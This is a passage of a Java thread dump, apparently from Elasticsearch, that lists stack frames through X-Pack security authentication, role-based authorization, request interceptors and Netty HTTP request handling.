       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5105/0x0000000801819878.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.TokenService.getAndValidateToken(TokenService.java:388)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:325)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:141)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:126)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.handleRequest(SecurityRestFilter.java:63)
       app//org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:236)
       app//org.elasticsearch.rest.RestController.tryAllHandlers(RestController.java:318)
       app//org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:176)
       app//org.elasticsearch.http.AbstractHttpServerTransport.dispatchRequest(AbstractHttpServerTransport.java:318)
       app//org.elasticsearch.http.AbstractHttpServerTransport.handleIncomingRequest(AbstractHttpServerTransport.java:372)
       app//org.elasticsearch.http.AbstractHttpServerTransport.incomingRequest(AbstractHttpServerTransport.java:308)
       org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:42)
       org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:28)
       io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:99)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       org.elasticsearch.http.netty4.Netty4HttpPipeliningHandler.channelRead(Netty4HttpPipeliningHandler.java:58)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:324)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:296)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.timeout.IdleStateHandler.channelRead(IdleStateHandler.java:286)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1518)
       io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1267)
       io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1314)
       io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501)
       io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
       io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163)
       io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714)
       io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615)
       io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578)
       io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493)
       io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
       io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
       java.base@15/java.lang.Thread.run(Thread.java:832)
     2/10 snapshots sharing following 331 elements
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizedIndicesFromRole(RBACEngine.java:518)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5197/0x0000000801826710.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5198/0x0000000801826938.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5201/0x0000000801826fd0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4866/0x0000000801607af8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4868/0x00000008017d0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$3(SecurityActionFilter.java:159)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4862/0x0000000801607238.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:108)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:155)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:83)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.shardExecute(TransportBroadcastReplicationAction.java:118)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.doExecute(TransportBroadcastReplicationAction.java:111)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.doExecute(TransportBroadcastReplicationAction.java:52)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:179)
       app//org.elasticsearch.action.support.ActionFilter$Simple.apply(ActionFilter.java:53)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$apply$0(SecurityActionFilter.java:87)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4859/0x0000000801606ba0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$authorizeRequest$4(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4864/0x0000000801607698.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$15(AuthorizationService.java:365)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5216/0x00000008018386d8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor.intercept(FieldAndDocumentLevelSecurityRequestInterceptor.java:65)
       org.elasticsearch.xpack.security.authz.interceptor.SearchRequestInterceptor.intercept(SearchRequestInterceptor.java:19)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.BulkShardRequestInterceptor.intercept(BulkShardRequestInterceptor.java:75)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor.intercept(FieldAndDocumentLevelSecurityRequestInterceptor.java:65)
       org.elasticsearch.xpack.security.authz.interceptor.UpdateRequestInterceptor.intercept(UpdateRequestInterceptor.java:23)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.IndicesAliasesRequestInterceptor.intercept(IndicesAliasesRequestInterceptor.java:106)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.ResizeRequestInterceptor.intercept(ResizeRequestInterceptor.java:86)
       org.elasticsearch.xpack.security.authz.AuthorizationService.runRequestInterceptors(AuthorizationService.java:366)
       org.elasticsearch.xpack.security.authz.AuthorizationService.handleIndexActionAuthorizationResult(AuthorizationService.java:343)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$9(AuthorizationService.java:285)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5199/0x0000000801826b60.accept(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:641)
       org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:616)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.buildIndicesAccessControl(RBACEngine.java:541)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$3(RBACEngine.java:321)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5203/0x0000000801827430.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5205/0x0000000801827890.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.resolveIndexNames(AuthorizationService.java:579)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$6(AuthorizationService.java:273)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5207/0x0000000801827cf0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5205/0x0000000801827890.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5197/0x0000000801826710.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5198/0x0000000801826938.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5201/0x0000000801826fd0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4866/0x0000000801607af8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4868/0x00000008017d0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$3(SecurityActionFilter.java:159)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4862/0x0000000801607238.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:108)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:155)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:83)
       app//org.elasticsearch.client.node.NodeClient.executeLocally(NodeClient.java:83)
       app//org.elasticsearch.client.node.NodeClient.doExecute(NodeClient.java:72)
       app//org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:409)
       app//org.elasticsearch.client.support.AbstractClient$IndicesAdmin.execute(AbstractClient.java:1274)
       app//org.elasticsearch.client.support.AbstractClient$IndicesAdmin.refresh(AbstractClient.java:1585)
       app//org.elasticsearch.rest.action.admin.indices.RestRefreshAction.lambda$prepareRequest$0(RestRefreshAction.java:60)
       app//org.elasticsearch.rest.action.admin.indices.RestRefreshAction$$Lambda$6003/0x000000080192ed78.accept(Unknown Source)
       app//org.elasticsearch.rest.BaseRestHandler.handleRequest(BaseRestHandler.java:115)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.lambda$handleRequest$0(SecurityRestFilter.java:76)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter$$Lambda$5235/0x000000080183abe0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.lambda$authenticateAndAttachToContext$2(SecondaryAuthenticator.java:82)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator$$Lambda$5259/0x000000080183e090.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.authenticate(SecondaryAuthenticator.java:92)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.authenticateAndAttachToContext(SecondaryAuthenticator.java:77)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.lambda$handleRequest$2(SecurityRestFilter.java:70)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter$$Lambda$5087/0x00000008017d7498.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$writeAuthToContext$24(AuthenticationService.java:680)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5234/0x000000080183a9b8.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.writeAuthToContext(AuthenticationService.java:695)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.finishAuthentication(AuthenticationService.java:669)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeUser(AuthenticationService.java:616)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$16(AuthenticationService.java:493)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5137/0x000000080181e560.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
